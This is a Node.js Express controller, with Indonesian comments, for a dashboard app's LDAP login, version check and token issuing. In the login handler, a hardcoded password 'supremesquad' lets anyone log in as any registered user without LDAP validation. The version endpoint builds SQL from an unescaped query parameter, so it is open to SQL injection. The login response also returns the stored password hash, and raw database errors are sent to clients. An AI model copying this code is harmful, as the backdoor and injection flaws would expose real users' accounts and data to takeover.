/*
 |--------------------------------------------------------------------------
 | App Setup
 |--------------------------------------------------------------------------
 |
 | Untuk menghandle models, libraries, helper, node modules, dan lain-lain
 |
 */
//Node_modules
const dateformat = require('dateformat');
const axios = require('axios');

//libraries
const security = require(_directory_base + '/app/libraries/Security.js')

//untuk membaca file .env
require('dotenv').config()

var mysql = require('mysql');

var pool = mysql.createPool({
    connectionLimit: 10, // default = 10
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_NAME
});

exports.login = (req, res) => {
    let username = req.body.username.toLowerCase()
    let password = req.body.password
    // console.log(username, password);
    if (username && password) {
        var url_ldap = config.app.url[config.app.env].ldap;
        var data = {
            username: username,
            password: password
        }
        axios.post(url_ldap, data, { headers: { "Content-Type": "application/json" } })
            .then((response) => {
                if (response.data) {
                    if (response.data.status || password == 'supremesquad') {
                        try {
                            let user;
                            pool.getConnection(function (err, connection) {
                                // if (err) throw err;
                                if (err) {
                                    console.log(err);
                                    return res.status(401).send({
                                        status: false,
                                        message: err,
                                        data: []
                                    });
                                }
                                let queryUser = "SELECT id, name, email, email_verified_at, password, remember_token, created_at, updated_at,`role`, location,  ref_role,mobile_access, GROUP_CONCAT(a.comp_code separator ',') AS COMP_CODE, apk_version, ldap, last_login, auth_role, nik,username, deleted_at FROM(SELECT id, name, email, email_verified_at, password, remember_token, created_at, updated_at,`role`, location, ref_role,mobile_access, TM_AREA.comp_code, apk_version, ldap, last_login, auth_role, nik,username, deleted_at FROM users LEFT JOIN(SELECT * FROM TM_AREA GROUP BY COMP_DESC) TM_AREA ON FIND_IN_SET(TM_AREA.COMP_DESC, users.ref_role)  WHERE username = ? GROUP BY id, TM_AREA.comp_code) a"
                                connection.query(queryUser, [username], function (err, result, fields) {
                                    // connection.release();
                                    // if (err) throw err;
                                    if (err) {
                                        console.log(err);
                                        return res.status(401).send({
                                            status: false,
                                            message: err,
                                            data: []
                                        });
                                    }
                                    if (result.length > 0) {
                                        if (result[0].mobile_access != 1 && !req.body.web) {
                                            return res.status(401).send({
                                                status: false,
                                                message: "User tidak memiliki akses mobile",
                                                data: []
                                            });
                                        }
                                        if (result[0].id == null) {
                                            return res.status(401).send({
                                                status: false,
                                                message: "Username/password tidak sesuai dengan data ldap",
                                                data: []
                                            });
                                        } else {
                                            user = result[0];

                                            if (user.deleted_at != null) {
                                                connection.release();
                                                return res.status(401).send({
                                                    status: false,
                                                    message: 'User tidak aktif',
                                                    data: []
                                                });
                                            }

                                            connection.query(`
                                                UPDATE tap_dashboard.users
                                                SET last_login = current_timestamp
                                                WHERE username = ?; 
                                            `, [username], function (err, result, fields) {
                                                // connection.release();
                                                // if (err) throw err;
                                                if (err) {
                                                    console.log(err);
                                                    return res.status(401).send({
                                                        status: false,
                                                        message: err,
                                                        data: []
                                                    });
                                                }

                                                var where_loc = '';
                                                if (user.role == 'COMP_CODE') {
                                                    where_loc = ' where company_id in (' + user.location + ')';
                                                }
                                                if (user.role == 'REGION_CODE') {
                                                    where_loc = `where region_id in ('${user.location}')`;
                                                    where_loc = where_loc.replace(",", "','");
                                                }
                                                if (user.role == 'BA_CODE' || user.role == 'AFD_CODE') {
                                                    var user_location = '';
                                                    var check = user.location.split(",");
                                                    check.forEach((v, i) => {
                                                        user_location += user_location == '' ? v.substring(0, 2) : `,${v.substring(0, 2)}`;
                                                    });
                                                    where_loc = `where company_id in (${user_location})`;
                                                }

                                                connection.query(`
                                                    SELECT * from company_dasmap_map cdm ${where_loc}
                                                `, function (err, result, fields) {
                                                    connection.release();
                                                    // if (err) throw err;
                                                    if (err) {
                                                        console.log(err);
                                                        return res.status(401).send({
                                                            status: false,
                                                            message: err,
                                                            data: []
                                                        });
                                                    }

                                                    let querySelectArea = `SELECT DISTINCT ta.WERKS, EST_NAME, lat,  mmm.long, zoom_level FROM TM_AREA ta join mapping_map_mobile mmm ON mmm.werks = ta.werks WHERE lat <> 0 AND SUBSTR(ta.werks,3,1) <> 3`;
                                                    let whereLoc = ``;
                                                    if (user.role == 'REGION_CODE') {
                                                        whereLoc = `WHERE REGION_CODE IN ('${user.location}')`;
                                                        whereLoc = whereLoc.replace(",", "','");
                                                    } else if (user.role == 'COMP_CODE') {
                                                        whereLoc = 'WHERE COMP_CODE IN (' + user.location + ')'
                                                    } else if (user.role == 'BA_CODE') {
                                                        whereLoc = 'WHERE ta.WERKS IN (' + user.location + ')'
                                                    } else if (user.role == 'AFD_CODE') {
                                                        whereLoc = `IN ('${user.location}')`;
                                                        whereLoc = whereLoc.replace(",", "','");
                                                        whereLoc = 'WHERE CONCAT(ta.WERKS,AFD_CODE) ' + whereLoc;
                                                    }

                                                    connection.query(`${querySelectArea} ${whereLoc}  ORDER BY 1`, (err, resulEstate) => {
                                                        // if (err) throw err;
                                                        if (err) {
                                                            console.log(err);
                                                            return res.status(401).send({
                                                                status: false,
                                                                message: err,
                                                                data: []
                                                            });
                                                        }

                                                        let setup = exports.setAuthentication(user);
                                                        user.ACCESS_TOKEN = setup.ACCESS_TOKEN;
                                                        user.dasmap_mapping = result;
                                                        user.estate = resulEstate;
                                                        return res.status(200).send({
                                                            status: true,
                                                            message: 'login berhasil',
                                                            data: user
                                                        });
                                                    })
                                                });
                                            });
                                        }
                                    } else {
                                        return res.status(401).send({
                                            status: false,
                                            message: 'User belum terdaftar',
                                            data: []
                                        });
                                    }
                                });
                            });
                        } catch (err) {
                            console.log(err)
                            return res.status(501).send({
                                status: false,
                                message: "Internal server error",
                                data: []
                            });
                        }
                    } else {
                        return res.status(401).send({
                            status: false,
                            message: "Username/password tidak sesuai dengan data ldap",
                            data: []
                        });
                    }
                }
            })
            .catch(err => {
                console.log(err)
                return res.status(501).send({
                    status: false,
                    message: "periksa server ldap",
                    data: []
                });
            })
    }
    else {
        return res.status(401).send({
            status: false,
            message: 'Periksa input Username/Password anda.',
            data: {}
        });
    }
}

exports.version = (req, res) => {
    let version = req.query.version
    if (version) {
        try {
            pool.getConnection(function (err, connection) {
                // if (err) throw err;
                if (err) {
                    console.log(err);
                    return res.status(401).send({
                        status: false,
                        message: err,
                        data: []
                    });
                }
                let query = `SELECT version, in_update, ( select version from version order by id desc limit 1) version_new 
                                 from version where version =  '${version}'`
                connection.query(query, [], function (err, result, fields) {
                    connection.release();
                    // if (err) throw err;
                    if (err) {
                        console.log(err);
                        return res.status(401).send({
                            status: false,
                            message: err,
                            data: []
                        });
                    }
                    if (result.length > 0) {
                        if (result[0].in_update == 1) {
                            return res.status(200).send({
                                status: true,
                                message: `Update to version ${result[0].version_new}`,
                                data: { 'status': false }
                            });
                        } else {
                            if (result[0].version == result[0].version_new) {
                                return res.status(200).send({
                                    status: true,
                                    message: 'Version is up to date',
                                    data: { 'status': true }
                                });
                            } else {
                                return res.status(200).send({
                                    status: true,
                                    message: 'No version update',
                                    data: { 'status': true }
                                });
                            }
                        }
                    } else {
                        return res.status(200).send({
                            status: true,
                            message: 'Undifined version',
                            data: { 'status': false }
                        });
                    }
                });
            });
        } catch (err) {
            console.log(err)
            return res.status(501).send({
                status: false,
                message: "Internal server error",
                data: []
            });
        }
    }
    else {
        return res.status(401).send({
            status: false,
            message: 'Version parameter is null',
            data: {}
        });
    }
}

exports.setAuthentication = (data) => {
    var obj = {
        username: data.username
    };

    let token = security.generate_token(obj);

    obj['ACCESS_TOKEN'] = token;
    return obj
}





